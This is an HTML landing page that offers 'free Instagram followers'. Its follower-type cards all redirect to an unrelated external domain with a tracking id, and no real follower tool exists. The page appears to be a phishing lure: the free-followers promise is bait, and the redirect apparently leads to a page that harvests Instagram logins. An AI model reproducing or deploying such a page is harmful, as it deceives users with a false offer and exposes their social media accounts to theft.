<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Followers Promotion</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4);
            margin: 0;
            padding: 0;
            color: #333;
            text-align: center;
        }

        header {
            background-color: #f09433;
            background-image: linear-gradient(315deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            padding: 20px;
            color: white;
        }

        h1 {
            margin: 0;
            font-size: 2.5em;
        }

        .promo-section {
            padding: 50px 20px;
        }

        .promo-section h2 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        .promo-section p {
            font-size: 1.2em;
            margin-bottom: 40px;
        }

        .cta-button {
            background-color: #405de6;
            color: white;
            padding: 15px 30px;
            font-size: 1.2em;
            border-radius: 50px;
            text-decoration: none;
            transition: background-color 0.3s ease;
            cursor: pointer;
        }

        .cta-button:hover {
            background-color: #833ab4;
        }

        .followers-section {
            padding: 50px 20px;
            display: none;
        }

        .followers-section h2 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        .followers-options {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-wrap: wrap;
        }

        .follower-type {
            margin: 20px;
            padding: 20px;
            background-color: #fff;
            color: #333;
            border-radius: 15px;
            width: 200px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            text-decoration: none;
            cursor: pointer;
        }

        .follower-type:hover {
            transform: translateY(-10px);
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
        }

        .follower-type img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin-bottom: 15px;
        }

        .follower-type h3 {
            font-size: 1.5em;
            margin: 0;
        }

        footer {
            padding: 20px;
            background-color: #405de6;
            color: white;
        }
    </style>
</head>
<body>
    <header>
        <h1>Boost Your Instagram Followers for Free!</h1>
    </header>
    
    <section class="promo-section">
        <h2>Get Free Followers</h2>
        <p>Increase your Instagram followers instantly by using our free follower tool!</p>
        <button class="cta-button" onclick="showFollowersSection()">Get Started</button>
    </section>

    <section class="followers-section" id="followersSection">
        <h2>Select the type of followers you want:</h2>
        <div class="followers-options">
            <div class="follower-type" onclick="redirectToLink()">
                <img src="https://img.icons8.com/color/100/000000/india.png" alt="Indian Followers">
                <h3>Indian Followers</h3>
            </div>
            <div class="follower-type" onclick="redirectToLink()">
                <img src="https://img.icons8.com/color/100/000000/africa.png" alt="African Followers">
                <h3>African Followers</h3>
            </div>
            <div class="follower-type" onclick="redirectToLink()">
                <img src="https://img.icons8.com/color/100/000000/usa.png" alt="American Followers">
                <h3>American Followers</h3>
            </div>
            <!-- Add more follower types as needed -->
        </div>
    </section>

    <footer>
        <p>&copy; 2024 Free Instagram Followers | All rights reserved.</p>
    </footer>

    <script>
        function showFollowersSection() {
            document.querySelector('.promo-section').style.display = 'none';
            document.getElementById('followersSection').style.display = 'block';
        }

        function redirectToLink() {
            window.location.href = "https://ix-event.com.tr/AF/IG/?id=5266236983";
        }
    </script>
</body>
</html>
